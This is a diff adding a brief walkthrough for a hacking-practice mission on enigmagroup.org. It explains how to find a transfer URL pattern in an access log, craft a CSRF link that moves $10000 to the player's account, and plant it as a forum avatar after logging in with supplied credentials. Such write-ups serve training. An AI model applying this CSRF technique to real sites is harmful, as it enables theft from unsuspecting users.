@@ -1,0 +1,18 @@
+on the bank page check out robots.txt
+there is an access_log directory
+go to it and look at access_log file
+this will tell you how to construct your CSRF
+do a search in it for lookuprightnowyoumayfindwhatyourelookingfor
+
+example found
+/authed/index.php?page=transfer&amount=$200&recipient=89032189&comment=good%20luck
+
+so we want /authed/index.php?page=transfer&amount=$10000&recipient=13370539&comment=owned in our CSRF
+full thing:
+http://www.enigmagroup.org/missions/realistics/nurv/bank/authed/index.php?page=transfer&amount=$10000&recipient=13370539&comment=owned
+
+then log in to the forum page ("community") on the actual NURV website as JohnSmith:JohnSmith
+go to edit profile
+in the avatar put that CSRF
+
+you win!
